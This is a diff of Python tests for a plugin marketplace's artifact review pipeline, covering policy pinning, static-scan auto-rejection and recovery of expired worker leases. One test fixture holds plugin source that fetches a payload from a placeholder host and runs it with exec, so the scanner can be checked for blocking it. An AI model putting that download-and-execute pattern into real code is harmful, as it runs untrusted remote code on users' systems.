@@ -491,7 +491,7 @@ def test_full_p1_pipeline_publishes_immutable_version_and_gates_feed(tmp_path: P
 
 
 def test_advanced_precheck_fixes_policy_before_active_policy_changes(tmp_path: Path) -> None:
-    async def scenario() -> tuple[dict, dict, list[dict], dict]:
+    async def scenario() -> tuple[dict, dict, dict, dict, list[dict], dict]:
         settings = load_settings(
             {
                 "ARTIFACTS_ENABLED": "true",
@@ -570,23 +570,132 @@ def test_advanced_precheck_fixes_policy_before_active_policy_changes(tmp_path: P
 
             second_policy = await activate_policy("pipeline-policy-2", "4.27.0", 2)
             assert await runner.run_once() == 1
+            after_static = await repository.get_artifact(submitted["id"])
+            assert after_static
+            route_job = next(
+                job for job in repository.jobs.values() if job["type"] == "route_review"
+            )
+            assert await runner.run_once() == 1
             pending = await repository.get_artifact(submitted["id"])
             assert pending
             return (
+                after_static,
                 pending,
                 static_job,
+                route_job,
                 await repository.list_review_runs(submitted["id"]),
                 second_policy,
             )
         finally:
             await artifact_service.close()
 
-    artifact, static_job, runs, active_policy = asyncio.run(scenario())
+    after_static, artifact, static_job, route_job, runs, active_policy = asyncio.run(scenario())
 
+    assert after_static["review_status"] == "scanning"
     assert artifact["review_status"] == "pending_review"
     assert artifact["policy_version_id"] == static_job["policy_version_id"]
+    assert artifact["policy_version_id"] == route_job["policy_version_id"]
     assert {run["policy_version_id"] for run in runs} == {artifact["policy_version_id"]}
     assert artifact["policy_version_id"] != active_policy["id"]
+
+
+def test_advanced_static_critical_rejects_without_routing(tmp_path: Path) -> None:
+    async def scenario() -> tuple[dict, list[dict], list[dict], list[dict]]:
+        settings = load_settings(
+            {
+                "ARTIFACTS_ENABLED": "true",
+                "ARTIFACT_LOCAL_ROOT": str(tmp_path / "critical-storage"),
+                "ARTIFACT_CDN_BASE_URL": "https://cdn.example.test",
+                "DATABASE_URL": "postgresql://example.invalid/market",
+            }
+        )
+        store = InMemoryMarketStore()
+        owner = store.upsert_github_user({"id": "100", "login": "alice", "name": "Alice"})
+        plugin = store.register_plugin(
+            owner,
+            {
+                "name": "astrbot_plugin_demo",
+                "display_name": "Demo",
+                "desc": "Demo plugin",
+                "author": "Alice",
+                "repo": "https://github.com/alice/astrbot_plugin_demo",
+                "tags": [],
+                "category": "other",
+            },
+        )
+        repository = InMemoryArtifactRepository(store)
+        storage = LocalArtifactStorage(
+            settings.artifacts.local_root,
+            settings.artifacts.cdn_base_url,
+        )
+        service = ArtifactService(
+            repository=repository,
+            storage=storage,
+            github=GithubSourceClient(),
+            max_upload_bytes=settings.artifacts.max_upload_bytes,
+        )
+        policy_service = ReviewPolicyService(repository)
+        actor = {"id": "core", "role": "core_admin", "username": "core"}
+        draft = await policy_service.create_draft(
+            version="critical-static-policy",
+            policy=advanced_policy_payload("4.26.5"),
+            actor=actor,
+            request_id="critical-static-create",
+            idempotency_key="critical-static-create",
+        )
+        await policy_service.activate(
+            draft["id"],
+            actor=actor,
+            request_id="critical-static-activate",
+            idempotency_key="critical-static-activate",
+            reason="Activate critical static test policy",
+        )
+        runner = ArtifactJobRunner(
+            repository=repository,
+            storage=storage,
+            prechecker=ArchivePrechecker(settings.artifacts),
+            scanner=StaticScanner(),
+            worker_id="critical-static-worker",
+            lease_seconds=60,
+            poll_seconds=1,
+            advanced_review_enabled=True,
+        )
+        try:
+            submitted = await service.submit_upload(
+                plugin=plugin,
+                user=owner,
+                stream=byte_stream(
+                    plugin_zip(
+                        main_source=(
+                            "import requests\n"
+                            "payload = requests.get('https://example.invalid/payload').text\n"
+                            "exec(payload)\n"
+                        )
+                    )
+                ),
+            )
+            assert await runner.run_once() == 1
+            assert await runner.run_once() == 1
+            artifact = await repository.get_artifact(submitted["id"])
+            assert artifact is not None
+            return (
+                artifact,
+                await repository.list_artifact_jobs(submitted["id"]),
+                await repository.list_review_runs(submitted["id"]),
+                await repository.list_review_decisions(submitted["id"]),
+            )
+        finally:
+            await service.close()
+
+    artifact, jobs, runs, decisions = asyncio.run(scenario())
+
+    static_run = next(run for run in runs if run["type"] == "static")
+    assert artifact["review_status"] == "rejected"
+    assert artifact["rejection_code"] == "critical_static_finding"
+    assert static_run["status"] == "succeeded"
+    assert static_run["coverage"]["outcome"] == "blocked"
+    assert not any(job["type"] == "route_review" for job in jobs)
+    assert decisions[-1]["action"] == "auto_reject"
 
 
 def test_terminal_precheck_failure_closes_run_and_marks_processing_failed(tmp_path: Path) -> None:
@@ -655,6 +764,88 @@ def test_terminal_precheck_failure_closes_run_and_marks_processing_failed(tmp_pa
     assert artifact["review_status"] == "processing_failed"
     assert runs[-1]["status"] == "failed"
     assert jobs[0]["status"] == "failed"
+
+
+def test_p1_precheck_and_static_recover_lost_worker_leases(tmp_path: Path) -> None:
+    async def scenario() -> tuple[dict, list[dict], list[dict]]:
+        settings = load_settings(
+            {
+                "ARTIFACTS_ENABLED": "true",
+                "ARTIFACT_LOCAL_ROOT": str(tmp_path / "lease-recovery-storage"),
+                "ARTIFACT_CDN_BASE_URL": "https://cdn.example.test",
+                "DATABASE_URL": "postgresql://example.invalid/market",
+            }
+        )
+        store = InMemoryMarketStore()
+        owner = store.upsert_github_user({"id": "100", "login": "alice", "name": "Alice"})
+        plugin = store.register_plugin(
+            owner,
+            {
+                "name": "astrbot_plugin_demo",
+                "display_name": "Demo",
+                "desc": "Demo plugin",
+                "author": "Alice",
+                "repo": "https://github.com/alice/astrbot_plugin_demo",
+                "tags": [],
+            },
+        )
+        repository = InMemoryArtifactRepository(store)
+        storage = LocalArtifactStorage(
+            settings.artifacts.local_root,
+            settings.artifacts.cdn_base_url,
+        )
+        service = ArtifactService(
+            repository=repository,
+            storage=storage,
+            github=GithubSourceClient(),
+            max_upload_bytes=settings.artifacts.max_upload_bytes,
+        )
+        runner = ArtifactJobRunner(
+            repository=repository,
+            storage=storage,
+            prechecker=ArchivePrechecker(settings.artifacts),
+            scanner=StaticScanner(),
+            worker_id="lease-recovery-worker",
+            lease_seconds=60,
+            poll_seconds=1,
+        )
+        try:
+            submitted = await service.submit_upload(
+                plugin=plugin,
+                user=owner,
+                stream=byte_stream(plugin_zip()),
+            )
+            precheck_job = (await repository.claim_jobs("crashed-precheck-worker", 1, 60))[0]
+            await repository.transition_review_status(submitted["id"], "prechecking")
+            repository.jobs[precheck_job["id"]]["lease_expires_at"] = "2000-01-01T00:00:00+00:00"
+            assert await runner.run_once() == 1
+
+            static_job = (await repository.claim_jobs("lost-static-ack-worker", 1, 60))[0]
+            assert static_job["type"] == "static_scan"
+            await runner._run_review_stage(static_job)
+            repository.jobs[static_job["id"]]["lease_expires_at"] = "2000-01-01T00:00:00+00:00"
+            assert await runner.run_once() == 1
+            artifact = await repository.get_artifact(submitted["id"])
+            assert artifact is not None
+            return (
+                artifact,
+                await repository.list_review_runs(submitted["id"]),
+                await repository.list_artifact_jobs(submitted["id"]),
+            )
+        finally:
+            await service.close()
+
+    artifact, runs, jobs = asyncio.run(scenario())
+
+    precheck_runs = [run for run in runs if run["type"] == "precheck"]
+    static_runs = [run for run in runs if run["type"] == "static"]
+    precheck_job = next(job for job in jobs if job["type"] == "precheck")
+    static_job = next(job for job in jobs if job["type"] == "static_scan")
+    assert artifact["review_status"] == "pending_review"
+    assert [(run["attempt"], run["status"]) for run in precheck_runs] == [(2, "succeeded")]
+    assert [(run["attempt"], run["status"]) for run in static_runs] == [(1, "succeeded")]
+    assert precheck_job["attempts"] == 2 and precheck_job["status"] == "succeeded"
+    assert static_job["attempts"] == 2 and static_job["status"] == "succeeded"
 
 
 def test_object_success_database_failure_never_exposes_release(tmp_path: Path) -> None:
